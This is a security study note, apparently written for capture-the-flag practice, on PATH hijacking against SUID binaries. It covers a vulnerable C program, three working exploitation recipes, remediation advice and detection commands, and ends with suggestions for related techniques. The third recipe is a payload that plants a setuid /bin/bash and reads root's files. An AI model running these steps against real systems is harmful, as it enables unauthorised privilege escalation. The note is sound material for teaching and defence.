# PATH Hijacking / Relative Path Exploitation

## Vulnerability

Occurs when a privileged script or binary calls another binary **by name only**, rather than by absolute path (e.g. `system("ls ...")` instead of `system("/bin/ls ...")`). The shell resolves the command by walking the directories listed in `$PATH`, in order — so if an attacker can control `$PATH` and place a malicious binary earlier in that search order, their binary runs instead of the intended one.

This is only meaningfully exploitable when the vulnerable program runs with **elevated privileges** (SUID/SGID, sudo, or a root-owned cron/script) — hijacking `$PATH` for your own unprivileged process is trivial and pointless; the value is in getting a *more privileged* process to trust an attacker-controlled `$PATH`.

### Example vulnerable binary (SUID)

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

`system()` invokes `/bin/sh -c "ls ..."`, and the shell resolves `ls` via `$PATH` — this is the exploitable step.

## Exploitation

General pattern: create a writable directory, drop a malicious file in it named after the command being called, then prepend that directory to `$PATH` so it's resolved first.

**Example 1 — symlink to another binary**
```bash
ln -s /bin/cat /tmp/stark/ls
export PATH=/tmp/stark:$PATH
./vulnerable
```
`ls` now resolves to `/tmp/stark/ls`, a symlink to `/bin/cat`. The SUID binary intended to run `ls`, but ends up running `cat` on the target file instead — reading it in full rather than listing it.

**Example 2 — direct copy**
```bash
cp /bin/cat /tmp/stark/ls
export PATH=/tmp/stark:$PATH
./vulnerable
```
Functionally identical to Example 1, just without the symlink — a real copy of `/bin/cat` named `ls` sits earlier in `$PATH` than the real one.

**Example 3 — arbitrary payload**
Once `$PATH` hijacking is confirmed, the "hijacked" binary doesn't need to mimic the original at all — it can run anything, with whatever privilege the vulnerable program inherits:
```bash
#!/bin/bash
chmod u+x /bin/bash
cat /root/root.txt
/bin/bash
```
This escalates from "read one file" to a persistent SUID `/bin/bash` and a root shell.

## Remediation

- **Always invoke commands by absolute path** (`/bin/ls`, not `ls`) in any privileged script or program.
- **Avoid `system()`/`popen()` in C entirely** where possible — they spawn a shell and inherit its environment, including `$PATH`. Prefer `execve()` with an explicit binary path and an explicit, minimal environment array (don't pass through the caller's environment).
- **In sudoers**, rely on `env_reset` (the default) so a user-controlled `$PATH` isn't inherited by the sudo'd command, and/or set `secure_path` to a fixed, trusted value.
- **In shell scripts**, avoid unqualified command calls when the script may run with elevated privileges — set `PATH` explicitly at the top of the script rather than trusting the caller's environment.
- **Principle of least privilege**: minimize what actually needs SUID/sudo in the first place — the smaller the privileged surface, the less there is to hijack.

## Detection (blue team side)

- Audit for SUID/SGID binaries: `find / -perm -4000 -o -perm -2000 2>/dev/null`
- For any hits, check what they call internally (`strings`, `strace -f -e execve`) — flag any unqualified command invocations.
- Audit sudoers for `!env_reset` or missing `secure_path`.
- Monitor for unexpected `$PATH` modifications preceding execution of privileged binaries (auditd rules on `execve` + environment).

---

## Gaps worth adding to this note

A few adjacent angles that round this technique out and will likely come up again on Root-Me / OSCP-style boxes:

1. **Wildcard injection** — a related-but-distinct technique (e.g. `tar`, `chown`, `rsync` run with `*` in a privileged context) where argument injection, not `$PATH`, is the vector. Worth a separate note, but easy to conflate with this one.
2. **`sudo -l` enumeration** — you didn't mention checking `sudo -l` for commands runnable without a full path, or with `SETENV` allowing `$PATH` passthrough — that's usually the actual discovery step before exploitation, not just "we know it's vulnerable."
3. **Cron jobs calling unqualified binaries** — same root cause, different discovery path (`/etc/crontab`, `/etc/cron.d/*`, spooled user crontabs) — often more common in real environments than SUID binaries.
4. **`LD_PRELOAD` / `LD_LIBRARY_PATH` hijacking** — a cousin technique operating at the dynamic linker level rather than `$PATH`, also gated on `env_reset`/sudoers config. Good "see also."
5. **GTFOBins cross-reference** — worth linking to the specific GTFOBins entries for any binary abused this way, since that's the standard reference readers will expect.
6. **Static vs SUID-inherited env nuance** — worth a line clarifying *why* `setreuid(geteuid(), geteuid())` matters here (dropping the "real" privilege check so effective privilege persists across the `system()` call) — you show the code but don't explain that line, and it's the kind of internals detail your StarkSec style usually calls out.
